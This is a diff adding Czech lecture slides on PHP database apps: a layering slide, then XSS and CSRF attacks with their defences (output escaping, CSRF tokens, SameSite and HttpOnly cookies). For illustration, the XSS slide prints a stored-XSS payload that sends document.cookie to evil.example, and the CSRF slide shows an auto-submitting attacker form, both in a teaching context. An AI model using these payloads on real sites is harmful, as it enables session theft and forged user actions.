@@ -86,6 +86,15 @@ ENGINE = InnoDB;
 
 ---
 
+# Struktura demo aplikace
+<!-- .slide: class="normal centered" -->
+
+![Vrstvy demo aplikace](assets/vrstvy-demo.svg) <!-- .element: style="height:680px;margin:0 auto;display:block" -->
+
+Prezentace nikdy nepracuje s SQL ani PDO, datová vrstva neobsahuje pravidla aplikace. <!-- .element: class="small" -->
+
+---
+
 # Práce s databází
 1. Připojení k databázovému serveru
 	- Autentizace aplikace (ne uživatele!)
@@ -325,6 +334,75 @@ try {
 - `password_verify($password, $hash)` – ověření hesla
 - `password_needs_rehash()` – přepočet po změně algoritmu nebo parametrů
 - [Demo aplikace](https://github.com/DIFS-Teaching/basic-demos/tree/master/php-login-db)
+
+---
+
+# Cross-Site Scripting (XSS)
+- Data z databáze (původně od uživatele) vypisujeme do HTML stránky
+- Pokud obsahují HTML/JavaScript, prohlížeč je provede v kontextu naší aplikace
+	- Krádež session, akce jménem uživatele, podvržený obsah stránky
+- **Uložené (stored) XSS** – útočný kód je uložen v databázi a zasáhne každého, kdo si stránku zobrazí
+
+```php
+// jméno uložené v DB:
+// <script>fetch('https://evil.example/?c=' + document.cookie)</script>
+echo "<td>" . $row['name'] . "</td>";   // NEBEZPEČNÉ
+```
+
+---
+
+# Ochrana proti XSS
+- **Escapovat při výstupu** podle kontextu
+	- HTML: `htmlspecialchars()` – převede `< > & " '` na entity
+	- Do databáze ukládáme data v původní podobě
+- Šablonovací systémy (Blade, Twig, Latte) escapují automaticky
+- Doplňková ochrana: cookie `HttpOnly`, hlavička `Content-Security-Policy`
+
+```php
+function h($s) {
+	return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
+}
+
+echo "<td>" . h($row['name']) . "</td>";
+?>
+<input name="name" value="<?= h($person['name']) ?>">
+```
+
+---
+
+# Cross-Site Request Forgery (CSRF)
+- Uživatel je přihlášen v naší aplikaci (session cookie)
+- Navštíví cizí stránku, která odešle požadavek na naši aplikaci
+- Prohlížeč k požadavku přiloží cookie → provede se **s právy uživatele**
+- Např. stránka útočníka obsahuje:
+
+```html
+<img src="https://is.example/person_delete.php?id=1&confirmed=yes">
+
+<form action="https://is.example/person_edit.php?id=1" method="post">
+	<input type="hidden" name="name" value="Hacked">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+# Ochrana proti CSRF
+- Operace měnící data **nikdy přes GET**
+- **CSRF token** – náhodná hodnota v session a ve skrytém poli formuláře; cizí stránka ji nezná
+- Doplňková ochrana: cookie `SameSite=Lax` nebo `Strict`
+- Frameworky řeší automaticky (Laravel `@csrf`, Symfony, Nette)
+
+```php
+// vytvoření tokenu (jednou pro session)
+$_SESSION['csrf_token'] ??= bin2hex(random_bytes(32));
+// ve formuláři: <input type="hidden" name="csrf_token" value="...">
+// ověření při zpracování formuláře
+if (!isset($_POST['csrf_token'])
+		|| !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+	http_response_code(403); exit();
+}
+```
 
 ---
 
